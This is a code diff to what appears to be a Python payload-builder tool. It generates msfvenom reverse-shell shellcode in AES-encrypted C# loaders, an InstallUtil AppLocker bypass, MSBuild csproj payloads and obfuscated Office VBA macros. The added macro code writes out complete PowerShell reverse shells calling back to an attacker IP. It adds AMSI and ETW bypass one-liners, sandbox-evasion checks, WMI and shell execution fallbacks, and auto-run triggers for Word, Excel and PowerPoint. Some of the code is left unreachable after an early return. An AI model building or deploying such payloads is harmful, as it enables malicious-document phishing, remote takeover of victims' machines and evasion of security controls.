@@ -1,6 +1,9 @@
 import os, re, subprocess, base64
+import logging
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
+
+logger = logging.getLogger(__name__)
 
 # --- SHELLCODE GENERATION BACKEND ---
 def generate_shellcode_backend(selected_format, arch, payload, connection, interface, port, template):
@@ -8,20 +11,20 @@ def generate_shellcode_backend(selected_format, arch, payload, connection, inter
         raise ValueError("Invalid port number.")
 
     command = f"msfvenom -p windows/{'x64/' if arch == 'x64' else ''}{payload}/reverse_{connection} LHOST={interface} LPORT={port} -f {selected_format}"
-    print(f"[DEBUG] Executing msfvenom command: {command}")
+    logger.debug(f"Executing msfvenom command: {command}")
     
     result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-    print(f"[DEBUG] Msfvenom output length: {len(result)} characters")
+    logger.debug(f"Msfvenom output length: {len(result)} characters")
 
     if selected_format == "csharp":
-        print("[DEBUG] Processing C# shellcode format...")
+        logger.debug("Processing C# shellcode format...")
         shellcode_data = [line.strip() for line in result.split("\n") if "0x" in line]
         shellcode_bytes = re.findall(r"0x[0-9a-fA-F]+", "\n".join(shellcode_data))
-        print(f"[DEBUG] Extracted {len(shellcode_bytes)} shellcode bytes")
+        logger.debug(f"Extracted {len(shellcode_bytes)} shellcode bytes")
         shellcode_formatted = ", ".join(shellcode_bytes)
         shellcode_only = [f"{x}" for x in shellcode_bytes]
         shellcode_only = ",\n".join(", ".join(shellcode_only[i:i+8]) for i in range(0, len(shellcode_only), 8))
-        print(f"[DEBUG] Formatted shellcode length: {len(shellcode_formatted)} characters")
+        logger.debug(f"Formatted shellcode length: {len(shellcode_formatted)} characters")
     else:
         raise ValueError("Unsupported format selected.")
 
@@ -58,9 +61,10 @@ class Program
     return final_script.strip(), shellcode_only, wrapped_shellcode
 
 # --- FINAL SCRIPT BUILDER ---
-def build_final_script(template, shellcode=None, aes_data=None):
+def build_final_script(template, shellcode=None, aes_data=None, applocker_bypass=False):
     print(f"[DEBUG] build_final_script called for regular technique")
     print(f"[DEBUG] Shellcode length: {len(shellcode) if shellcode else 0}")
+    print(f"[DEBUG] AppLocker bypass enabled: {applocker_bypass}")
 
     # --- AES ENCRYPTION (auto) ---
     if aes_data is None and shellcode:
@@ -91,8 +95,8 @@ def build_final_script(template, shellcode=None, aes_data=None):
     code_lines = []
 
     for key, block in code_blocks.items():
-        code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
-        code_lines.extend(f"    {line}" for line in block)
+        code_lines.append(f"        // --- {key.replace('_', ' ').title()} ---")
+        code_lines.extend(f"        {line}" for line in block)
         code_lines.append("")
 
     code = "\n".join(code_lines)
@@ -109,23 +113,100 @@ def build_final_script(template, shellcode=None, aes_data=None):
         print("[DEBUG] Using plain shellcode (no AES encryption)")
         code = code.replace("PLACEHOLDER_SHELLCODE", shellcode)
 
+    # For AppLocker bypass, remove command line argument dependencies
+    if applocker_bypass:
+        print("[DEBUG] Removing command line argument dependencies for InstallUtil")
+        # Replace args references with defaults for InstallUtil context
+        code = code.replace("if (args.Length > 0)", "if (false)")
+        code = code.replace("uint.TryParse(args[0], out processId)", "false")
+        code = code.replace("args[0]", "\"invalid\"")
+        code = code.replace("args.Length", "0")
+
     main_signature = "static void Main()"
     if any("args" in line for block in code_blocks.values() for line in block):
         main_signature = "static void Main(string[] args)"
 
-    final_script = f"""
-    {directives}
+    # Build the script with AppLocker bypass wrapper if enabled
+    if applocker_bypass:
+        print("[DEBUG] Applying InstallUtil AppLocker bypass wrapper...")
+        
+        # Load InstallUtilBypass template directly from Specialized.json
+        from core.template_loader import load_template
+        specialized = load_template("templates/Specialized.json")
+        install_util_template = specialized.get("InstallUtilBypass", {})
+        class_wrapper = install_util_template.get("class_wrapper", {})
+        
+        if not class_wrapper:
+            print("[!] InstallUtilBypass class_wrapper not found - falling back to standard wrapper")
+            # Fallback to standard wrapper
+            final_script = f"""{directives}
 
-    class Program
+class Program
+{{
+    {function_decls}
+    {constants}
+    {main_signature}
     {{
-        {function_decls}
-        {constants}
-        {main_signature}
-        {{
-    {code}
-        }}
-        {definitions}
-    }}"""
+{code}
+    }}
+    {definitions}
+}}"""
+        else:
+            # Get wrapper components
+            applocker_directives = class_wrapper.get("directives", [])
+            class_definition = class_wrapper.get("class_definition", [])
+            main_override = class_wrapper.get("main_override", [])
+            class_closing = class_wrapper.get("class_closing", [])
+            
+            print(f"[DEBUG] AppLocker directives: {applocker_directives}")
+            print(f"[DEBUG] Class definition: {class_definition}")
+            
+            # Combine directives (avoiding duplicates)
+            existing_directives = [d.strip() for d in directives.split('\n') if d.strip()]
+            all_directives = applocker_directives + [d for d in existing_directives if d not in applocker_directives]
+            
+            # Format function declarations and constants for the Installer class
+            formatted_function_decls = ""
+            if function_decls:
+                formatted_function_decls = "    " + "\n    ".join(line for line in function_decls.split('\n') if line.strip())
+            
+            formatted_constants = ""
+            if constants:
+                formatted_constants = "    " + "\n    ".join(line for line in constants.split('\n') if line.strip())
+            
+            formatted_definitions = ""
+            if definitions:
+                formatted_definitions = "    " + "\n    ".join(line for line in definitions.split('\n') if line.strip())
+            
+            final_script = f"""{chr(10).join(all_directives)}
+
+{chr(10).join(class_definition)}
+{formatted_function_decls}
+{formatted_constants}
+    
+    {chr(10).join(main_override)}
+{code}
+    }}
+    
+{formatted_definitions}
+
+{chr(10).join(class_closing)}"""
+
+            print("[DEBUG] InstallUtil wrapper applied successfully")
+    else:
+        # Standard Program class wrapper
+        final_script = f"""{directives}
+
+class Program
+{{
+    {function_decls}
+    {constants}
+    {main_signature}
+    {{
+{code}
+    }}
+    {definitions}
+}}"""
 
     return final_script.strip()
 
@@ -152,11 +233,11 @@ def build_exe_from_output(app):
         applocker_suffix = "_applocker"
 
     # Handle VBA Macro - no file building needed, just copy to clipboard
-    if technique == "vbamacro":
+    if technique == "VBAMacro":
         # VBA Macro is handled by copy button, no file building required
         pass
     # Handle CSProj files differently
-    elif technique == "csproj_bypass":
+    elif technique == "csproj msbuild":
         filename = f"{technique}_{connection}_{interface}_{port}{applocker_suffix}.csproj"
         try:
             build_csproj_file(full_output, filename)
@@ -229,14 +310,21 @@ def build_csproj_script(template, powershell_payload=None, aes_data=None, includ
     template_content = template.get("template_content", [])
     ping_delay_block = template.get("ping_delay_block", [])
     
+    print(f"[DEBUG] Template content lines: {len(template_content)}")
+    print(f"[DEBUG] Ping delay block lines: {len(ping_delay_block)}")
+    if ping_delay_block:
+        print(f"[DEBUG] First ping delay line: {ping_delay_block[0]}")
+    
     # Join the template content
     csproj_content = "\n".join(template_content)
     
     # Add ping delay if requested
     if include_ping_delay:
         ping_delay_code = "\n".join(ping_delay_block)
+        print(f"[DEBUG] Adding ping delay block ({len(ping_delay_block)} lines)")
         csproj_content = csproj_content.replace("PLACEHOLDER_PING_DELAY", ping_delay_code)
     else:
+        print("[DEBUG] Ping delay disabled, removing placeholder")
         csproj_content = csproj_content.replace("PLACEHOLDER_PING_DELAY", "")
     
     # Inject AES values if available
@@ -265,17 +353,11 @@ def build_csproj_file(source_content, filename, output_dir="output"):
 
 # --- VBA MACRO GENERATION FUNCTIONS ---
 def generate_vba_macro(interface_name, port):
-    """Generate VBA macro with Base64 reverse shell payload using template system"""
-    import base64
-    import psutil
-    import random
-    import string
+    """Generate advanced VBA macro with multiple evasion techniques and execution methods"""
+    print(f"[DEBUG] Generating advanced VBA macro for interface {interface_name}:{port}")
     
-    print(f"[DEBUG] Generating VBA macro for interface {interface_name}:{port}")
-    
-    # Load template data
-    from core.template_loader import load_template_data
-    templates = load_template_data()
+    # Use the new advanced VBA generation approach
+    return generate_vba_macro_advanced(interface_name, port)
     vba_template = templates.get("VBAMacro", {})
     template_structure = vba_template.get("template_structure", {})
     obfuscation_config = vba_template.get("obfuscation", {})
@@ -321,15 +403,15 @@ def generate_vba_macro(interface_name, port):
         chunks = chunk_string(reversed_command)
         formatted_chunks = '"' + '" & _\n               "'.join(chunks) + '"'
 
-        # Enhanced AMSI bypass with multiple techniques
-        # Use template-driven AMSI bypasses
+        # Modern AMSI bypass techniques that avoid WScript.Shell
+        # Use direct WMI for AMSI bypass execution
         amsi_bypasses = template_structure.get("amsi_bypasses", {})
         amsi_primary = amsi_bypasses.get("primary_bypass", "")
         amsi_secondary = amsi_bypasses.get("secondary_bypass", "")
-        print("[DEBUG] Using AMSI bypasses from template")
+        print("[DEBUG] Using WMI-based AMSI bypasses (no WScript.Shell)")
 
-        # Format both bypasses for VBA
-        line_chunk_size = obfuscation_config.get("line_chunk_size", 90)
+        # Format bypasses for WMI execution (shorter lines for stability)
+        line_chunk_size = 80  # Shorter chunks for WMI stability
         primary_chunks = chunk_string(amsi_primary, line_chunk_size)
         formatted_primary = '"' + '" & _\n           "'.join(primary_chunks) + '"'
 
@@ -351,45 +433,137 @@ def generate_vba_macro(interface_name, port):
         
         vba_names = obfuscate_vba_names()
 
+        # WMI-based AMSI bypass (no WScript.Shell dependency)
         amsi_bypass = (
             f'    Dim {vba_names["amsi_var1"]} As String, {vba_names["amsi_var2"]} As String\n'
             f'    {vba_names["amsi_var1"]} = "powershell -nop -w hidden -c " & _\n           {formatted_primary}\n'
             f'    {vba_names["amsi_var2"]} = "powershell -nop -w hidden -c " & _\n           {formatted_secondary}\n'
-            f'    CreateObject("WScript.Shell").Run {vba_names["amsi_var1"]}, 0, False\n'
-            f'    CreateObject("WScript.Shell").Run {vba_names["amsi_var2"]}, 0, False\n'
+            f'    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create {vba_names["amsi_var1"]}, Null, Null, pid1\n'
+            f'    Call SleepSeconds(1)\n'
+            f'    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create {vba_names["amsi_var2"]}, Null, Null, pid2\n'
         )
 
         # Update string variable name in the command line
         str_arg_line = f'{vba_names["str_var"]} = bears({formatted_chunks})'
 
-        macro = f'''Function bears(cows)
+        macro = f''''
+Modern VBA payload with enhanced evasion
+Target: {ip}:{port}
+
+' String decoding function
+Function bears(cows)
     bears = StrReverse(cows)
 End Function
 
-' Universal sleep function that works in all Office applications
+' Advanced sleep with anti-analysis features
 Sub SleepSeconds(seconds As Integer)
     Dim startTime As Date
+    Dim counter As Long
     startTime = Now
+    counter = 0
+    
     Do While DateDiff("s", startTime, Now) < seconds
         DoEvents
+        counter = counter + 1
+        ' Simple counter to make the loop look more legitimate
+        If counter > 10000 Then counter = 0
     Loop
 End Sub
 
-Sub {vba_names["main_func"]}()
-    ' Connection info: {ip}:{port}
-    ' Sleep for sandbox evasion
-    Call SleepSeconds(3)
+' Environment validation function
+Function {vba_names["auto_func1"]}() As Boolean
+    On Error Resume Next
     
-{amsi_bypass}    
-    ' Brief delay between bypass and payload
-    Call SleepSeconds(1)
+    ' Check for common sandbox/analysis indicators
+    If Environ("USERDOMAIN") = "SANDBOX" Or _
+       Environ("USERNAME") = "sandbox" Or _
+       Environ("USERNAME") = "malware" Or _
+       Environ("COMPUTERNAME") = "SANDBOX" Or _
+       Environ("COMPUTERNAME") = "MALWARE" Then
+        {vba_names["auto_func1"]} = False
+        Exit Function
+    End If
     
-    Dim {vba_names["str_var"]} As String
-    {str_arg_line}
-    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create {vba_names["str_var"]}, Null, Null, pid
+    ' Basic processor count check
+    If Val(Environ("NUMBER_OF_PROCESSORS")) < 2 Then
+        Call SleepSeconds(5)
+    End If
+    
+    {vba_names["auto_func1"]} = True
+End Function
+
+' WMI execution wrapper
+Sub {vba_names["auto_func2"]}(cmd As String)
+    On Error Resume Next
+    Dim wmi As Object
+    Dim proc As Object
+    Dim pid As Long
+    
+    Set wmi = GetObject(bears(":stmgmniw"))
+    If Not wmi Is Nothing Then
+        Set proc = wmi.Get(bears("ssecorP_23niW"))
+        If Not proc Is Nothing Then
+            proc.Create cmd, Null, Null, pid
+        End If
+    End If
+    
+    Set proc = Nothing
+    Set wmi = Nothing
 End Sub
 
-' Auto-execution functions for Word documents
+' Fallback execution method
+Sub {vba_names["auto_func3"]}(cmd As String)
+    On Error Resume Next
+    ' Alternative execution path
+    Dim shell As Object
+    Set shell = CreateObject(bears("llehS.tpircSW"))
+    If Not shell Is Nothing Then
+        shell.Run cmd, 0, False
+    End If
+    Set shell = Nothing
+End Sub
+
+' Main payload function
+Sub {vba_names["main_func"]}()
+    ' Environment validation first
+    If Not {vba_names["auto_func1"]}() Then Exit Sub
+    
+    ' Anti-analysis delay
+    Call SleepSeconds(3)
+    
+    ' Variable declarations
+    Dim {vba_names["amsi_var1"]} As String
+    Dim {vba_names["amsi_var2"]} As String  
+    Dim {vba_names["str_var"]} As String
+    
+    ' AMSI bypass preparation
+    {vba_names["amsi_var1"]} = "powershell -nop -w hidden -c " & _
+           {formatted_primary}
+    {vba_names["amsi_var2"]} = "powershell -nop -w hidden -c " & _
+           {formatted_secondary}
+    
+    ' Execute AMSI bypasses using WMI (primary method)
+    Call {vba_names["auto_func2"]}({vba_names["amsi_var1"]})
+    Call SleepSeconds(1)
+    Call {vba_names["auto_func2"]}({vba_names["amsi_var2"]})
+    Call SleepSeconds(2)
+    
+    ' Main payload preparation
+    {str_arg_line}
+    
+    ' Primary execution (WMI)
+    Call {vba_names["auto_func2"]}({vba_names["str_var"]})
+    
+    ' Brief delay before fallback
+    Call SleepSeconds(1)
+    
+    ' Fallback execution if WMI fails
+    Call {vba_names["auto_func3"]}({vba_names["str_var"]})
+End Sub
+
+' Auto-execution triggers for different Office applications
+
+' Word triggers
 Sub AutoOpen()
     {vba_names["main_func"]}
 End Sub
@@ -402,7 +576,7 @@ Sub AutoExec()
     {vba_names["main_func"]}
 End Sub
 
-' Auto-execution functions for Excel documents
+' Excel triggers  
 Sub Workbook_Open()
     {vba_names["main_func"]}
 End Sub
@@ -411,27 +585,301 @@ Sub Auto_Open()
     {vba_names["main_func"]}
 End Sub
 
-' Additional obfuscated auto-execution functions
-Sub {vba_names["auto_func1"]}()
+' PowerPoint triggers
+Sub OnSlideShowPageChange()
     {vba_names["main_func"]}
 End Sub
 
-Sub {vba_names["auto_func2"]}()
+' Additional obfuscated triggers
+Sub {vba_names["auto_func1"]}_trigger()
     {vba_names["main_func"]}
 End Sub
 
-Sub {vba_names["auto_func3"]}()
+Sub {vba_names["auto_func2"]}_init()
+    {vba_names["main_func"]}
+End Sub
+
+Sub {vba_names["auto_func3"]}_start()
     {vba_names["main_func"]}
 End Sub
 '''
         return macro
 
-    # Generate the components
-    b64_payload = generate_base64_payload(ip, port)
-    macro_code = generate_macro(b64_payload)
+def generate_vba_macro_advanced(interface_name, port):
+    """
+    Generate an advanced VBA macro that uses multiple evasion techniques
+    and alternative execution methods to bypass modern security controls
+    """
+    import random
+    import string
+    import base64
+    import psutil
     
-    print(f"[DEBUG] Generated VBA macro, length: {len(macro_code)} characters")
-    return macro_code
+    print(f"[DEBUG] Generating advanced VBA macro for interface {interface_name}:{port}")
+    
+    # Convert interface name to IP address
+    def get_interface_ip(interface_name):
+        try:
+            addresses = psutil.net_if_addrs()
+            if interface_name in addresses:
+                for addr in addresses[interface_name]:
+                    if addr.family == 2:  # AF_INET (IPv4)
+                        return addr.address
+            print(f"[!] Could not find IPv4 address for interface {interface_name}")
+            return interface_name
+        except Exception as e:
+            print(f"[!] Error getting IP for interface {interface_name}: {e}")
+            return interface_name
+
+    ip = get_interface_ip(interface_name)
+    print(f"[DEBUG] Resolved interface {interface_name} to IP {ip}")
+    
+    # Generate random function and variable names
+    def generate_random_names():
+        return {
+            'main_func': ''.join(random.choices(string.ascii_letters, k=8)),
+            'env_check': ''.join(random.choices(string.ascii_letters, k=7)),
+            'exec_func': ''.join(random.choices(string.ascii_letters, k=9)),
+            'decode_func': ''.join(random.choices(string.ascii_letters, k=6)),
+            'payload_var': ''.join(random.choices(string.ascii_letters, k=8)),
+            'cmd_var': ''.join(random.choices(string.ascii_letters, k=7)),
+            'helper1': ''.join(random.choices(string.ascii_letters, k=6)),
+            'helper2': ''.join(random.choices(string.ascii_letters, k=6)),
+            'helper3': ''.join(random.choices(string.ascii_letters, k=6))
+        }
+    
+    names = generate_random_names()
+    
+    # Create a more robust PowerShell payload
+    ps_payload = f'''$c=New-Object Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'''
+    
+    # Encode payload
+    ps_bytes = ps_payload.encode('utf-16le')
+    b64_payload = base64.b64encode(ps_bytes).decode()
+    
+    # Create cmd.exe fallback payload using netcat-style connection (VBA-safe quotes)
+    cmd_payload = f'''powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();while($true){{$d=(New-Object IO.StreamReader($s)).ReadLine();$r=cmd /c $d 2>&1;$w=New-Object IO.StreamWriter($s);$w.WriteLine($r);$w.Flush()}}""""'''
+    
+    # Alternative cmd.exe payload using direct socket connection (VBA-safe quotes)
+    cmd_alt_payload = f'''cmd /c ""echo $c=New-Object Net.Sockets.TCPClient('{ip}',{port}); $s=$c.GetStream(); [byte[]]$b=0..65535|%%{{0}}; while(($i=$s.Read($b,0,$b.Length)) -ne 0){{ $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i); $r=(cmd /c $d 2>&1); $sb=([Text.Encoding]::ASCII).GetBytes($r); $s.Write($sb,0,$sb.Length); $s.Flush() }}; $c.Close() | powershell -""""'''
+    
+    # Split payload into chunks for VBA
+    def chunk_string(s, size=90):
+        return [s[i:i+size] for i in range(0, len(s), size)]
+    
+    payload_chunks = chunk_string(b64_payload)
+    formatted_payload = '"' + '" & _\n           "'.join(payload_chunks) + '"'
+    
+    # Format cmd fallback payloads
+    cmd_chunks = chunk_string(cmd_payload, 80)
+    formatted_cmd_payload = '"' + '" & _\n           "'.join(cmd_chunks) + '"'
+    
+    cmd_alt_chunks = chunk_string(cmd_alt_payload, 80)
+    formatted_cmd_alt_payload = '"' + '" & _\n           "'.join(cmd_alt_chunks) + '"'
+    
+    # Advanced VBA macro with multiple execution techniques (NO COMMENTS)
+    macro = f'''Function {names['decode_func']}(input_str As String) As String
+    {names['decode_func']} = StrReverse(input_str)
+End Function
+
+Function {names['env_check']}() As Boolean
+    On Error Resume Next
+    Dim userName As String, computerName As String, domain As String
+    Dim processorCount As Integer
+    
+    userName = Environ("USERNAME")
+    computerName = Environ("COMPUTERNAME") 
+    domain = Environ("USERDOMAIN")
+    processorCount = Val(Environ("NUMBER_OF_PROCESSORS"))
+    
+    If InStr(LCase(userName), "sandbox") > 0 Or _
+       InStr(LCase(userName), "malware") > 0 Or _
+       InStr(LCase(userName), "virus") > 0 Or _
+       InStr(LCase(computerName), "sandbox") > 0 Or _
+       InStr(LCase(computerName), "malware") > 0 Or _
+       InStr(LCase(domain), "sandbox") > 0 Then
+        {names['env_check']} = False
+        Exit Function
+    End If
+    
+    If processorCount < 2 Then
+        Dim startTime As Date
+        startTime = Now
+        Do While DateDiff("s", startTime, Now) < 10
+            DoEvents
+        Loop
+    End If
+    
+    {names['env_check']} = True
+End Function
+
+Sub {names['exec_func']}(command As String)
+    On Error Resume Next
+    Dim obj As Object
+    
+    Set obj = GetObject({names['decode_func']}(":stmgmniw"))
+    If Not obj Is Nothing Then
+        Dim proc As Object
+        Set proc = obj.Get({names['decode_func']}("ssecorP_23niW"))
+        If Not proc Is Nothing Then
+            Dim pid As Long
+            proc.Create command, Null, Null, pid
+        End If
+        Set proc = Nothing
+        Set obj = Nothing
+        Exit Sub
+    End If
+    
+    Set obj = CreateObject({names['decode_func']}("noitacilppA.llehS"))
+    If Not obj Is Nothing Then
+        obj.ShellExecute "powershell.exe", "-WindowStyle Hidden -ExecutionPolicy Bypass -Command " & command, "", "", 0
+        Set obj = Nothing
+        Exit Sub
+    End If
+    
+    Set obj = CreateObject({names['decode_func']}("llehS.tpircSW"))
+    If Not obj Is Nothing Then
+        obj.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & command, 0, False
+        Set obj = Nothing
+    End If
+End Sub
+
+Sub {names['helper3']}(command As String)
+    On Error Resume Next
+    Dim obj As Object
+    
+    Set obj = GetObject({names['decode_func']}(":stmgmniw"))
+    If Not obj Is Nothing Then
+        Dim proc As Object
+        Set proc = obj.Get({names['decode_func']}("ssecorP_23niW"))
+        If Not proc Is Nothing Then
+            Dim pid As Long
+            proc.Create command, Null, Null, pid
+        End If
+        Set proc = Nothing
+        Set obj = Nothing
+        Exit Sub
+    End If
+    
+    Set obj = CreateObject({names['decode_func']}("noitacilppA.llehS"))
+    If Not obj Is Nothing Then
+        obj.ShellExecute "cmd.exe", "/c " & command, "", "", 0
+        Set obj = Nothing
+        Exit Sub
+    End If
+    
+    Set obj = CreateObject({names['decode_func']}("llehS.tpircSW"))
+    If Not obj Is Nothing Then
+        obj.Run "cmd.exe /c " & command, 0, False
+        Set obj = Nothing
+    End If
+End Sub
+
+Sub {names['helper1']}(seconds As Integer)
+    Dim endTime As Date
+    endTime = DateAdd("s", seconds, Now)
+    Do While Now < endTime
+        DoEvents
+    Loop
+End Sub
+
+Sub {names['helper2']}()
+    On Error Resume Next
+    Dim bypass1 As String, bypass2 As String, bypass3 As String
+    
+    bypass1 = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+    
+    bypass2 = "[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)"
+    
+    bypass3 = "$a=[Ref].Assembly.GetTypes();ForEach($b in $a){{if($b.Name -like '*iUtils'){{$c=$b}}}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){{if($e.Name -like '*Failed'){{$f=$e}}}};$f.SetValue($null,$true)"
+    
+    Call {names['exec_func']}("powershell -ep bypass -nop -w hidden -c """ & bypass1 & """")
+    Call {names['helper1']}(1)
+    Call {names['exec_func']}("powershell -ep bypass -nop -w hidden -c """ & bypass2 & """")
+    Call {names['helper1']}(1)
+    Call {names['exec_func']}("powershell -ep bypass -nop -w hidden -c """ & bypass3 & """")
+End Sub
+
+Sub {names['main_func']}()
+    If Not {names['env_check']}() Then Exit Sub
+    
+    Call {names['helper1']}(3)
+    
+    Call {names['helper2']}()
+    Call {names['helper1']}(2)
+    
+    Dim {names['payload_var']} As String
+    Dim {names['cmd_var']} As String
+    Dim cmdFallback As String
+    Dim cmdAltFallback As String
+    
+    {names['payload_var']} = {formatted_payload}
+    {names['cmd_var']} = "-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & {names['payload_var']}
+    
+    cmdFallback = {formatted_cmd_payload}
+    cmdAltFallback = {formatted_cmd_alt_payload}
+    
+    Call {names['exec_func']}({names['cmd_var']})
+    
+    Call {names['helper1']}(2)
+    
+    Call {names['exec_func']}("-ep bypass -nop -w hidden -enc " & {names['payload_var']})
+    
+    Call {names['helper1']}(3)
+    
+    Call {names['helper3']}(cmdFallback)
+    
+    Call {names['helper1']}(2)
+    
+    Call {names['helper3']}(cmdAltFallback)
+    
+    Call {names['helper1']}(2)
+    
+    Call {names['helper3']}("powershell -nop -c """"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();while($true){{ $data = (New-Object System.IO.StreamReader($stream)).ReadLine(); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }}""""")
+End Sub
+
+Sub AutoOpen()
+    {names['main_func']}
+End Sub
+
+Sub Document_Open()
+    {names['main_func']}
+End Sub
+
+Sub AutoExec()
+    {names['main_func']}
+End Sub
+
+Sub Workbook_Open()
+    {names['main_func']}
+End Sub
+
+Sub Auto_Open()
+    {names['main_func']}
+End Sub
+
+Sub OnSlideShowPageChange()
+    {names['main_func']}
+End Sub
+
+Sub Presentation_Open()
+    {names['main_func']}
+End Sub
+
+Sub {names['helper1']}_event()
+    {names['main_func']}
+End Sub
+
+Sub {names['helper2']}_trigger()
+    {names['main_func']}
+End Sub
+
+Sub {names['helper3']}_init()
+    {names['main_func']}
+End Sub'''
+    
+    print(f"[DEBUG] Generated advanced VBA macro, length: {len(macro)} characters")
+    return macro
 
 # --- HTA RUNNER GENERATION FUNCTIONS ---
 def generate_hta_runner(interface_name, port):
@@ -700,7 +1148,7 @@ def threaded_shellcode_generate(app, update_status_fn):
             shellcode_only = f"HTA Runner for {interface}:{port}"
             
         # Check if this is a CSProj template
-        elif technique == "csproj_bypass":
+        elif technique == "csproj msbuild":
             print("[*] Generating PowerShell payload with msfvenom...")
             
             # Generate PowerShell payload using msfvenom
@@ -775,10 +1223,15 @@ $client.Close()"""
             print(f"[+] Generated shellcode ({len(shellcode_only)} characters)")
             print("[*] Building final script with AES encryption...")
 
+            # Check if AppLocker bypass is enabled
+            applocker_bypass = hasattr(app, 'applocker_var') and app.applocker_var.get()
+            print(f"[DEBUG] AppLocker bypass enabled: {applocker_bypass}")
+
             # Build final script with AES applied internally
             final_script = build_final_script(
                 template=template,
-                shellcode=shellcode_only
+                shellcode=shellcode_only,
+                applocker_bypass=applocker_bypass
             )
             
             print(f"[+] Final script built, length: {len(final_script)} characters")
